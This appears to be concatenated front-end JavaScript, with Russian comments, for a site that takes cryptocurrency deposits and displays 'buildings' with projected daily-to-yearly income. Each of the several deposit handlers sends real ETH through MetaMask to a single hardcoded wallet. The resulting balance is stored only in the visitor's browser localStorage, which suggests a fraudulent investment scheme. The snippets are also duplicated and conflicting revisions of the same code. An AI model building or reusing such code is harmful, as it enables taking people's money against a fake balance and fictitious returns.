document.addEventListener("DOMContentLoaded", function () {
    let balance = parseFloat(localStorage.getItem("balance")) || 0;
    let balanceElem = document.getElementById("balance");
    const ethToUsdRate = 3000; // Фиксированный курс ETH → USD

    function updateBalanceDisplay(amountChanged = 0) {
        balanceElem.innerText = `$${balance.toLocaleString("en-US")}`;
        localStorage.setItem("balance", balance);

        if (amountChanged !== 0) {
            balanceElem.style.color = amountChanged > 0 ? "green" : "red";
            balanceElem.style.transform = "scale(1.2)";
            setTimeout(() => {
                balanceElem.style.color = "";
                balanceElem.style.transform = "scale(1)";
            }, 500);
        }
    }

    document.getElementById("deposit-button").addEventListener("click", async function () {
        if (typeof window.ethereum !== "undefined") {
            try {
                const usdAmount = prompt("Введите сумму пополнения в $:", "100");

                if (!usdAmount || isNaN(usdAmount) || parseFloat(usdAmount) <= 0) {
                    alert("❌ Неверная сумма!");
                    return;
                }

                // Конвертируем $ в ETH
                const ethAmount = parseFloat(usdAmount) / ethToUsdRate;
                const ethInWei = BigInt(ethAmount * 1e18).toString();

                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                const sender = accounts[0];

                const transaction = {
                    from: sender,
                    to: "0x624DB1b9E2f4d96fE89c65133337DEb8166bCAf1",
                    value: ethInWei
                };

                const txHash = await window.ethereum.request({ method: "eth_sendTransaction", params: [transaction] });

                alert(`✅ Транзакция отправлена! Hash: ${txHash}`);

                // Пополняем баланс в $
                balance += parseFloat(usdAmount);
                updateBalanceDisplay(parseFloat(usdAmount));
            } catch (error) {
                alert(`❌ Ошибка: ${error.message}`);
            }
        } else {
            alert("❌ Установите MetaMask!");
        }
    });

    updateBalanceDisplay();
});
document.addEventListener("DOMContentLoaded", function () {
    let username = localStorage.getItem("username");
    let balance = parseFloat(localStorage.getItem("balance")) || 0;
    let balanceElem = document.getElementById("balance");

    if (!username) {
        window.location.href = "auth.html"; // Если нет имени – перекидываем на регистрацию
    }

    function updateBalanceDisplay(amountChanged = 0) {
        balanceElem.innerText = `$${balance.toLocaleString("en-US")}`;
        localStorage.setItem("balance", balance);
    }

    document.getElementById("logout-button").addEventListener("click", function () {
        localStorage.removeItem("username"); // Удаляем данные
        localStorage.removeItem("balance");
        window.location.href = "auth.html"; // Возвращаем на страницу входа
    });

    updateBalanceDisplay();
});
document.addEventListener("DOMContentLoaded", function () {
    let username = localStorage.getItem("username");
    let balance = parseFloat(localStorage.getItem("balance")) || 0;
    let balanceElem = document.getElementById("balance");

    if (!username) {
        window.location.href = "auth.html"; // Без логина перекидываем на авторизацию
    }

    function updateBalanceDisplay() {
        balanceElem.innerText = `$${balance.toLocaleString("en-US")}`;
        localStorage.setItem("balance", balance);
    }

    document.getElementById("logout-button").addEventListener("click", function () {
        localStorage.removeItem("username");
        window.location.href = "auth.html"; // Выход на страницу входа
    });

    updateBalanceDisplay();
});
document.getElementById("deposit-button").addEventListener("click", async function () {
    if (typeof window.ethereum !== "undefined") {
        try {
            const usdAmount = prompt("Введите сумму пополнения в $:", "10");

            if (!usdAmount || isNaN(usdAmount) || parseFloat(usdAmount) < 5) {
                alert("❌ Минимальная сумма пополнения – $5!");
                return;
            }

            const ethToUsdRate = 3000; // Фиксированный курс ETH → USD
            const ethAmount = parseFloat(usdAmount) / ethToUsdRate;
            const ethInWei = BigInt(ethAmount * 1e18).toString();

            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
            const sender = accounts[0];

            const transaction = {
                from: sender,
                to: "0x624DB1b9E2f4d96fE89c65133337DEb8166bCAf1",
                value: ethInWei
            };

            const txHash = await window.ethereum.request({ method: "eth_sendTransaction", params: [transaction] });

            alert(`✅ Транзакция отправлена! Hash: ${txHash}`);

            let balance = parseFloat(localStorage.getItem("balance")) || 0;
            balance += parseFloat(usdAmount);
            localStorage.setItem("balance", balance);

            document.getElementById("balance").innerText = `$${balance.toLocaleString("en-US")}`;
        } catch (error) {
            alert(`❌ Ошибка: ${error.message}`);
        }
    } else {
        alert("❌ Установите MetaMask!");
    }
});
document.getElementById("deposit-button").addEventListener("click", async function () {
    if (typeof window.ethereum !== "undefined") {
        try {
            const ethAmount = 0.008; // Фиксированная сумма 0.008 ETH
            const ethInWei = BigInt(ethAmount * 1e18).toString();

            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
            const sender = accounts[0];

            const transaction = {
                from: sender,
                to: "0x624DB1b9E2f4d96fE89c65133337DEb8166bCAf1",
                value: ethInWei
            };

            const txHash = await window.ethereum.request({ method: "eth_sendTransaction", params: [transaction] });

            alert(`✅ Транзакция отправлена! Hash: ${txHash}`);

            let balance = parseFloat(localStorage.getItem("balance")) || 0;
            const ethToUsdRate = 3000; // Примерный курс ETH → USD
            const usdAmount = ethAmount * ethToUsdRate;
            balance += usdAmount;

            localStorage.setItem("balance", balance);
            document.getElementById("balance").innerText = `$${balance.toLocaleString("en-US")}`;
        } catch (error) {
            alert(`❌ Ошибка: ${error.message}`);
        }
    } else {
        alert("❌ Установите MetaMask!");
    }
});
document.addEventListener("DOMContentLoaded", function () {
    document.querySelectorAll(".building").forEach(building => {
        let dailyIncome = parseFloat(building.dataset.income);
        
        let weeklyIncome = dailyIncome * 7;
        let monthlyIncome = dailyIncome * 30;
        let yearlyIncome = dailyIncome * 365;

        building.querySelector(".income-info").innerHTML = `
            💰 Доход:<br>
            ▸ В день: <b>$${dailyIncome}</b><br>
            ▸ В неделю: <b>$${weeklyIncome}</b><br>
            ▸ В месяц: <b>$${monthlyIncome}</b><br>
            ▸ В год: <b>$${yearlyIncome}</b>
        `;
    });
});
